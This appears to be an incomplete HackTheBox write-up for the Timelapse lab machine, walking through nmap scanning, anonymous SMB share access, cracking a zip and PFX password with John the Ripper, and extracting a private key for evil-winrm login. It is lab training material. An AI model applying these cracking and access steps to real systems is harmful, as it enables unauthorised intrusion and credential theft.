# Timelapse---HackTheBox-Writeup
A guide for the [Timelapse Challenge in HackTheBox](https://app.hackthebox.com/machines/Timelapse)


1. Run [Nmap](https://nmap.org/) ``` sudo nmap -sV -O -Pn -v 10.10.11.152 ```<br>

> <ul>
>    <li>-sV: Probe open ports to determine service/version info</li>
>    <li>-O: Enable OS detection</li>
>    <li>-Pn: Treat all hosts as online -- skip host discovery</li>
>    <li>-v: Increase verbosity level (use -vv or more for greater effect)</li>
> </ul>

  In which we are able to find out that it has:
 - 2 ports running Samba Servers(139 and 445)

```
elrond@kali  ~  sudo nmap -sV -O -Pn -v 10.10.11.152 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-31 00:52 EDT
NSE: Loaded 45 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 00:52
Completed Parallel DNS resolution of 1 host. at 00:52, 0.02s elapsed
Initiating SYN Stealth Scan at 00:52
Scanning 10.10.11.152 [1000 ports]
Discovered open port 139/tcp on 10.10.11.152
Discovered open port 135/tcp on 10.10.11.152
Discovered open port 445/tcp on 10.10.11.152
Discovered open port 53/tcp on 10.10.11.152
Discovered open port 593/tcp on 10.10.11.152
Discovered open port 636/tcp on 10.10.11.152
Discovered open port 464/tcp on 10.10.11.152
Discovered open port 88/tcp on 10.10.11.152
Discovered open port 389/tcp on 10.10.11.152
Completed SYN Stealth Scan at 00:52, 6.49s elapsed (1000 total ports)
Initiating Service scan at 00:52
Scanning 9 services on 10.10.11.152
Completed Service scan at 00:52, 16.16s elapsed (9 services on 1 host)
Initiating OS detection (try #1) against 10.10.11.152
Retrying OS detection (try #2) against 10.10.11.152
NSE: Script scanning 10.10.11.152.
Initiating NSE at 00:52
Completed NSE at 00:52, 0.22s elapsed
Initiating NSE at 00:52
Completed NSE at 00:52, 0.17s elapsed
Nmap scan report for 10.10.11.152
Host is up (0.089s latency).
Not shown: 991 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-03-31 12:52:28Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.69 seconds
           Raw packets sent: 2067 (94.656KB) | Rcvd: 29 (1.848KB)
```

2. Exploiting the [Samba Server](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)<br>
  <ul><li>Try to connect and list down the shares in the smbclient

> <ul>
>    <li>-N|--no-pass:no password</li>
>    <li>-L|--list:HOST</li>
> </ul>

```
 elrond@kali  ~  smbclient -N -L \\\\10.10.11.152\\
```
```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
</li>
  <li> Now that we know some sharenames on the target, let's try connnecting to them and see what files we can find
  
  ```
      elrond@kali  ~/Downloads/HackTheBox  smbclient -N \\\\10.10.11.152\\Shares\\
  ```
  ```
      Try "help" to get a list of possible commands.
      smb: \> dir
        .                                   D        0  Mon Oct 25 11:39:15 2021
        ..                                  D        0  Mon Oct 25 11:39:15 2021
        Dev                                 D        0  Mon Oct 25 15:40:06 2021
        HelpDesk                            D        0  Mon Oct 25 11:48:42 2021

                      6367231 blocks of size 4096. 1167073 blocks available
      smb: \> cd Dev
      smb: \Dev\> dir
        .                                   D        0  Mon Oct 25 15:40:06 2021
        ..                                  D        0  Mon Oct 25 15:40:06 2021
        winrm_backup.zip                    A     2611  Mon Oct 25 11:46:42 2021

                      6367231 blocks of size 4096. 1167025 blocks available
      smb: \Dev\> get winrm_backup.zip
      getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (4.2 KiloBytes/sec) (average 4.2 KiloBytes/sec)
  ```
    
  </li>
  <li>
    And after manually extracting it, we discover that it is a password protected filein which we know need to give this file to John The Ripper via zip2john

```
elrond@kali  ~/Downloads/HackTheBox/Timelapse  zip2john winrm_backup.zip > timelapse.txt
    
Created directory: /home/elrond/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8
```


```
elrond@kali  ~/Downloads/HackTheBox/Timelapse  john timelapse.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2022-03-31 02:08) 4.166g/s 14472Kp/s 14472Kc/s 14472KC/s surkerior..superkebab
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
  </li>
  </ul>


4. Decrypting The file<br>
   Now that we have Figured out the password which is *supremelegacy* we can now unzip the file, showing a PFX file ```legacyy_dev_auth.pfx``` 
  which contains the SSL certificate (public keys) and the corresponding private keys of who we presume is a *Developer(Dev)* with the username *legacyy*.
  However accessing the file would need us to provide another password to access it, hence we must send it again to *John The Ripper* via pfx2john
  ```
  elrond@kali  ~/Downloads/HackTheBox/Timelapse  pfx2john legacyy_dev_auth.pfx > keys.txt                 
  ```
  ```
  elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls                                      
  keys.txt  legacyy_dev_auth.pfx  timelapse.txt  winrm_backup.zip
  ```
  ```
  elrond@kali  ~/Downloads/HackTheBox/Timelapse  john keys.txt --wordlist=/usr/share/wordlists/rockyou.txt
  Using default input encoding: UTF-8
  Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 AVX 4x])
  Cost 1 (iteration count) is 2000 for all loaded hashes
  Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
  Will run 4 OpenMP threads
  Press 'q' or Ctrl-C to abort, almost any other key for status
  thuglegacy       (legacyy_dev_auth.pfx)     
  1g 0:00:01:31 DONE (2022-03-31 02:44) 0.01098g/s 35484p/s 35484c/s 35484C/s thuglife06..thug211
  Use the "--show" option to display all of the cracked passwords reliably
  Session completed. 
  ```
  here we figure out that the password is *thuglegacy*, and we can now access the file. but what now? utlizing a search engine we discover what we can extract from it. 
  ![timelapse2](https://user-images.githubusercontent.com/101177396/161009781-0923574b-279b-46bc-bbaa-4ee062230147.PNG)
  Luckily it also shows how to extract it
  
  

  ```
  elrond@kali  ~/Downloads/HackTheBox/Timelapse  openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key    
  Enter Import Password:
  Enter PEM pass phrase:
  Verifying - Enter PEM pass phrase:
   elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls
  keys.txt  legacyy_dev_auth.pfx  prv.key  timelapse.txt  winrm_backup.zip
   elrond@kali  ~/Downloads/HackTheBox/Timelapse  openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt 
  Enter Import Password:
   elrond@kali  ~/Downloads/HackTheBox/Timelapse  ls  
  cert.crt  keys.txt  legacyy_dev_auth.pfx  prv.key  timelapse.txt  winrm_backup.zip

  ```
  Since the we're trying top execute a file with another file on a separate folder(and we might do so again in the future),
  we're going to create an alias for it in our shell(bash/zsh/fsh depends on your default shell)
  ```alias evil-winrm="ruby ~/Documents/github \directories/evil-winrm/evil-winrm.rb"```
  
5. 
